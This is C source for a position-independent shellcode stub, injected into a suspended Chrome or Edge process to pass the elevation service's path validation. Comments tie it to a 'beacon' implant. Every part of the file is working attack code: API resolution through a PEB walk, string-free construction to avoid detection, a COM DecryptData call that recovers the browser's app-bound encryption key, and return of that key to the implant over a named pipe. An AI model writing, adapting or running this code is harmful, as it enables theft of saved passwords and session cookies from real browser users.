// abe_stub.c — position-independent stub injected into a CREATE_SUSPENDED
// chrome.exe / msedge.exe so the elevation service's PathValidation passes.
//
// The stub does ONLY the path-validated COM DecryptData; every other step
// (SQLite read, AES-GCM, key derivation, GCM tag-oracle) stays in the beacon.
// It returns the raw DecryptData output to the beacon over a named pipe, then
// ExitThread()s (the original suspended main thread is never resumed).
//
// Build: gcc -O2 -fno-stack-protector -nostdlib -fno-asynchronous-unwind-tables \
//          -fno-ident -fno-exceptions -fno-tree-loop-distribute-patterns -c
//        ld  -T abe_stub.ld --oformat binary   -> flat .bin with entry() at offset 0
//
// PIC discipline: NO string literals, NO file-scope data. Every "string" / GUID
// is a stack array built from immediate bytes so the object has only .text
// (no .rdata/.data, no absolute relocations). Compound literals inside entry()
// are automatic-storage stack arrays -> immediate stores, not .rdata refs.
// -fno-tree-loop-distribute-patterns keeps our manual copy/cmp loops from being
// rewritten into memcpy/memcmp/strcmp libcalls (there is no libc at all).

#include <stdint.h>
#include "abe_iface.h"

/* ---- minimal Win32 types (no <windows.h> in the stub) -------------------- */
typedef unsigned short WCHAR;
typedef wchar_t        WT;            /* for wide string literals */
typedef WCHAR*         BSTR;
typedef unsigned long  HRESULT, DWORD;
typedef int            BOOL;
typedef void*          HANDLE;
typedef void*          HMODULE;
typedef void*          FARPROC;

#define SUCCEEDED(hr) ((long)(hr) >= 0)
#define FAILED(hr)    ((long)(hr) <  0)
#define E_NOINTERFACE 0x80004002u

#ifdef _WIN64
#define WINAPI
#else
#define WINAPI __attribute__((stdcall))
#endif

/* COM / pipe constants (no headers to pull the macros from) */
#define COINIT_APARTMENTTHREADED     0x2u
#define CLSCTX_LOCAL_SERVER          0x4u
#define RPC_C_AUTHN_DEFAULT          0xFFFFFFFFu
#define RPC_C_AUTHZ_DEFAULT          0xFFFFFFFFu
#define RPC_C_AUTHN_LEVEL_PKT_PRIVACY 6u
#define RPC_C_IMP_LEVEL_IMPERSONATE  3u
#define EOAC_DYNAMIC_CLOAKING        0x20u
#define GENERIC_WRITE                0x40000000u
#define OPEN_EXISTING                3u

/* ---- tiny libc-free helpers (kept as loops; -fno-tree-loop-distribute) --- */
static void mcpy(uint8_t *d, const uint8_t *s, uint32_t n){ while(n--) *d++=*s++; }
static void mzero(uint8_t *d, uint32_t n){ while(n--) *d++=0; }

static int astrcmp(const char *a, const char *b){
    while(*a && *b){ if(*a!=*b) return (int)*a-(int)*b; a++; b++; }
    return (int)*a-(int)*b;
}

/* case-insensitive compare of a UNICODE_STRING buffer (chars, not NUL-term'd)
   against a NUL-terminated wide target; returns 1 on equal length+content. */
static int wdll_ieq(const WCHAR *a, int chars, const WT *b){
    int i;
    for(i=0;i<chars;i++){
        WT ca=a[i], cb=b[i];
        if(cb==0) return 0;                       /* target shorter */
        if(ca>=L'A'&&ca<=L'Z') ca=(WT)(ca+32);
        if(cb>=L'A'&&cb<=L'Z') cb=(WT)(cb+32);
        if(ca!=cb) return 0;
    }
    return b[chars]==0 ? 1 : 0;                   /* target must end exactly here */
}

/* ---- PEB address (segment read; the one piece that needs inline asm) ----- */
static __inline__ void *peb_addr(void){
#ifdef _WIN64
    void *p; __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(p)); return p;
#else
    void *p; __asm__ volatile ("movl %%fs:0x30, %0" : "=r"(p)); return p;
#endif
}

/* ---- kernel32 base by PEB InLoadOrderModuleList + BaseDllName match ------ */
static void *find_kernel32(void){
    uint8_t *peb = (uint8_t*)peb_addr();
#ifdef _WIN64
    uint8_t *ldr = *(uint8_t**)(peb + 0x18);
#else
    uint8_t *ldr = *(uint8_t**)(peb + 0x0c);
#endif
    void *head = (void*)(ldr + 0x10);             /* PEB_LDR_DATA.InLoadOrderModuleList */
    void *cur  = *(void**)head;                  /* Flink */
    while(cur && cur != head){
        uint8_t *e = (uint8_t*)cur;              /* InLoadOrderLinks is at +0 */
#ifdef _WIN64
        void    *base = *(void**)(e + 0x30);
        uint16_t len  = *(uint16_t*)(e + 0x58);  /* BaseDllName.Length (bytes) */
        WCHAR   *buf  = *(WCHAR**)(e + 0x60);    /* BaseDllName.Buffer */
#else
        void    *base = *(void**)(e + 0x18);
        uint16_t len  = *(uint16_t*)(e + 0x2c);
        WCHAR   *buf  = *(WCHAR**)(e + 0x30);
#endif
        if(base && buf){
            const WT k32[] = {L'k',L'e',L'r',L'n',L'e',L'l',L'3',L'2',
                              L'.',L'd',L'l',L'l',0};
            if(wdll_ieq(buf, len/2, k32)) return base;
        }
        cur = *(void**)cur;                      /* next Flink */
    }
    return (void*)0;
}

/* ---- resolve an export by name from a loaded module base (PE walk) ------- */
static void *get_export(void *base, const char *name){
    uint8_t *b = (uint8_t*)base;
    uint32_t e_lfanew = *(uint32_t*)(b + 0x3c);
    uint8_t *nt  = b + e_lfanew;
    uint8_t *opt = nt + 24;                      /* past Signature(4)+FileHeader(20) */
    uint16_t magic = *(uint16_t*)opt;
    uint8_t *dd;
    if(magic == 0x10b)      dd = opt + 96;       /* PE32  : DataDirectory at +96  */
    else if(magic == 0x20b) dd = opt + 112;      /* PE32+ : DataDirectory at +112 */
    else return (void*)0;
    uint32_t expRva = *(uint32_t*)dd;            /* DataDirectory[0] = export */
    if(!expRva) return (void*)0;
    uint8_t *exp = b + expRva;
    uint32_t nNames    = *(uint32_t*)(exp + 0x18);
    uint32_t addrFuncs = *(uint32_t*)(exp + 0x1c);
    uint32_t addrNames = *(uint32_t*)(exp + 0x20);
    uint32_t addrOrd   = *(uint32_t*)(exp + 0x24);
    uint32_t *names = (uint32_t*)(b + addrNames);
    uint16_t *ords  = (uint16_t*)(b + addrOrd);
    uint32_t *funcs = (uint32_t*)(b + addrFuncs);
    uint32_t i;
    for(i=0;i<nNames;i++){
        const char *fn = (const char*)(b + names[i]);
        if(astrcmp(fn, name) == 0) return (void*)(b + funcs[ords[i]]);
    }
    return (void*)0;
}

/* ---- resolved-API function pointer typedefs ------------------------------ */
typedef HMODULE (WINAPI *LoadLibraryA_t)(const char*);
typedef FARPROC (WINAPI *GetProcAddress_t)(HMODULE, const char*);
typedef HRESULT (WINAPI *CoInitializeEx_t)(void*, DWORD);
typedef HRESULT (WINAPI *CoCreateInstance_t)(void*, void*, DWORD, void*, void**);
typedef HRESULT (WINAPI *CoSetProxyBlanket_t)(void*, DWORD, DWORD, void*,
                                              DWORD, DWORD, void*, DWORD);
typedef void    (WINAPI *CoUninitialize_t)(void);
typedef BSTR    (WINAPI *SysAllocStringByteLen_t)(const char*, unsigned int);
typedef void    (WINAPI *SysFreeString_t)(BSTR);
typedef unsigned int (WINAPI *SysStringByteLen_t)(BSTR);
typedef HANDLE  (WINAPI *CreateFileA_t)(const char*, DWORD, DWORD, void*,
                                        DWORD, DWORD, HANDLE);
typedef BOOL    (WINAPI *WriteFile_t)(HANDLE, const void*, unsigned int,
                                      unsigned int*, void*);
typedef BOOL    (WINAPI *CloseHandle_t)(HANDLE);
typedef void    (WINAPI *ExitThread_t)(DWORD);
typedef unsigned long (WINAPI *Release_t)(void*);
typedef HRESULT (WINAPI *DecryptData_t)(void*, BSTR, BSTR*, unsigned int*);

/* ---- entry: invoked as the remote thread proc; rcx/[_esp+4] = StubData* -- */
__attribute__((section(".text.entry"), used, noinline))
void entry(StubData *d){
    StubResponse r;
    uint8_t clsid[16], iid[16];
    void *p = (void*)0;
    BSTR bstrIn = (BSTR)0, bstrOut = (BSTR)0;
    unsigned int comErr = 0;
    HRESULT hr;
    uint32_t status = 0;

    mzero((uint8_t*)&r, sizeof(r));

    /* All API pointers are zeroed up front so every goto below is safe
       (a jumped-over initializer would otherwise leave them indeterminate). */
    LoadLibraryA_t   pLoadLibraryA   = (LoadLibraryA_t)0;
    GetProcAddress_t pGetProcAddress = (GetProcAddress_t)0;
    CreateFileA_t    pCreateFileA    = (CreateFileA_t)0;
    WriteFile_t      pWriteFile      = (WriteFile_t)0;
    CloseHandle_t    pCloseHandle    = (CloseHandle_t)0;
    ExitThread_t     pExitThread     = (ExitThread_t)0;
    CoInitializeEx_t        pCoInit     = (CoInitializeEx_t)0;
    CoCreateInstance_t      pCoCreate   = (CoCreateInstance_t)0;
    CoSetProxyBlanket_t     pSetBlanket = (CoSetProxyBlanket_t)0;
    CoUninitialize_t        pCoUninit   = (CoUninitialize_t)0;
    SysAllocStringByteLen_t pSysAlloc   = (SysAllocStringByteLen_t)0;
    SysFreeString_t         pSysFree    = (SysFreeString_t)0;
    SysStringByteLen_t      pSysByteLen = (SysStringByteLen_t)0;
    void *k32 = (void*)0;

    /* 1. resolve kernel32 + the two universal resolvers */
    k32 = find_kernel32();
    if(!k32){ status=1; goto done; }
    pLoadLibraryA   = (LoadLibraryA_t)  get_export(k32, (char[]){'L','o','a','d','L','i','b','r','a','r','y','A',0});
    pGetProcAddress = (GetProcAddress_t)get_export(k32, (char[]){'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0});
    if(!pLoadLibraryA || !pGetProcAddress){ status=1; goto done; }

    /* kernel32: pipe + thread APIs */
    pCreateFileA = (CreateFileA_t)pGetProcAddress(k32, (char[]){'C','r','e','a','t','e','F','i','l','e','A',0});
    pWriteFile   = (WriteFile_t)  pGetProcAddress(k32, (char[]){'W','r','i','t','e','F','i','l','e',0});
    pCloseHandle = (CloseHandle_t)pGetProcAddress(k32, (char[]){'C','l','o','s','e','H','a','n','d','l','e',0});
    pExitThread  = (ExitThread_t) pGetProcAddress(k32, (char[]){'E','x','i','t','T','h','r','e','a','d',0});

    /* 2. load ole32 / oleaut32 + the COM + BSTR APIs */
    {
        HMODULE ole32  = pLoadLibraryA((char[]){'o','l','e','3','2','.','d','l','l',0});
        HMODULE oleaut = pLoadLibraryA((char[]){'o','l','e','a','u','t','3','2','.','d','l','l',0});
        pCoInit     = (CoInitializeEx_t)       pGetProcAddress(ole32,  (char[]){'C','o','I','n','i','t','i','a','l','i','z','e','E','x',0});
        pCoCreate   = (CoCreateInstance_t)     pGetProcAddress(ole32,  (char[]){'C','o','C','r','e','a','t','e','I','n','s','t','a','n','c','e',0});
        pSetBlanket = (CoSetProxyBlanket_t)    pGetProcAddress(ole32,  (char[]){'C','o','S','e','t','P','r','o','x','y','B','l','a','n','k','e','t',0});
        pCoUninit   = (CoUninitialize_t)       pGetProcAddress(ole32,  (char[]){'C','o','U','n','i','n','i','t','i','a','l','i','z','e',0});
        pSysAlloc   = (SysAllocStringByteLen_t)pGetProcAddress(oleaut, (char[]){'S','y','s','A','l','l','o','c','S','t','r','i','n','g','B','y','t','e','L','e','n',0});
        pSysFree    = (SysFreeString_t)        pGetProcAddress(oleaut, (char[]){'S','y','s','F','r','e','e','S','t','r','i','n','g',0});
        pSysByteLen = (SysStringByteLen_t)     pGetProcAddress(oleaut, (char[]){'S','y','s','S','t','r','i','n','g','B','y','t','e','L','e','n',0});
    }

    /* 3. build the GUIDs on the stack from StubData bytes */
    mcpy(clsid, d->clsid, 16);

    /* 4. CoInitializeEx (apartment-threaded; S_FALSE is fine) */
    if(pCoInit) pCoInit((void*)0, COINIT_APARTMENTTHREADED);

    /* 5. CoCreateInstance: try iid_v2 first for Chrome, else iid_v1; fallback v1 */
    if(d->tryV2First){
        mcpy(iid, d->iid_v2, 16);
        hr = pCoCreate ? pCoCreate((void*)clsid, (void*)0, CLSCTX_LOCAL_SERVER,
                                   (void*)iid, &p) : E_NOINTERFACE;
        if(FAILED(hr) || !p){ mcpy(iid, d->iid_v1, 16);
            hr = pCoCreate ? pCoCreate((void*)clsid, (void*)0, CLSCTX_LOCAL_SERVER,
                                       (void*)iid, &p) : E_NOINTERFACE;
        }
    } else {
        mcpy(iid, d->iid_v1, 16);
        hr = pCoCreate ? pCoCreate((void*)clsid, (void*)0, CLSCTX_LOCAL_SERVER,
                                   (void*)iid, &p) : E_NOINTERFACE;
    }
    if(FAILED(hr) || !p){ status=2; r.hr=(uint32_t)hr; goto cleanup; }

    /* 6. CoSetProxyBlanket — required for the elevation service proxy */
    hr = pSetBlanket ? pSetBlanket(p, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
                                   (void*)0, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                                   RPC_C_IMP_LEVEL_IMPERSONATE, (void*)0,
                                   EOAC_DYNAMIC_CLOAKING) : E_NOINTERFACE;
    if(FAILED(hr)){ status=3; r.hr=(uint32_t)hr; goto cleanup; }

    /* 7. SysAllocStringByteLen(keyBytes, keyLen) -> BSTR (byte-length, no terms) */
    bstrIn = pSysAlloc ? pSysAlloc((const char*)d->keyBytes, d->keyLen) : (BSTR)0;
    if(!bstrIn){ status=4; r.hr=0; goto cleanup; }

    /* 8. DecryptData via the dynamic vtable index (Chrome=5, Edge=8) */
    {
        void **vt = *(void***)p;
        DecryptData_t fn = (DecryptData_t)vt[d->vtIdx];
        hr = fn(p, bstrIn, &bstrOut, &comErr);
    }
    if(FAILED(hr) || !bstrOut){ status=4; r.hr=(uint32_t)hr; r.comErr=comErr; goto cleanup; }

    /* 9. capture the raw decrypted output */
    {
        unsigned int outLen = pSysByteLen ? pSysByteLen(bstrOut) : 0;
        if(outLen > 256) outLen = 256;
        r.keyLen = outLen;
        if(outLen) mcpy(r.keyBytes, (const uint8_t*)bstrOut, outLen);
        status = 0;
    }

cleanup:
    if(bstrOut && pSysFree) pSysFree(bstrOut);
    if(bstrIn  && pSysFree) pSysFree(bstrIn);
    if(p){
        void **vt = *(void***)p;
        Release_t rel = (Release_t)vt[2];        /* IUnknown::Release */
        if(rel) rel(p);
    }
    if(pCoUninit) pCoUninit();

done:
    /* 10. report back over the named pipe, then exit the thread */
    r.magic  = STUB_MAGIC;
    r.status = status;
    if(pCreateFileA && pWriteFile){
        HANDLE hp = pCreateFileA(d->pipeName, GENERIC_WRITE, 0, (void*)0,
                                 OPEN_EXISTING, 0, (HANDLE)0);
        if(hp != (HANDLE)(intptr_t)-1){
            unsigned int wr = 0;
            pWriteFile(hp, (const void*)&r, (unsigned int)sizeof(r), &wr, (void*)0);
            if(pCloseHandle) pCloseHandle(hp);
        }
    }
    if(pExitThread) pExitThread(0);
    /* If ExitThread is unavailable (k32-resolution failed before we could
       resolve it), just return — a CreateRemoteThread thread proc exits
       cleanly when its start routine returns. Never hang the host thread. */
    return;
}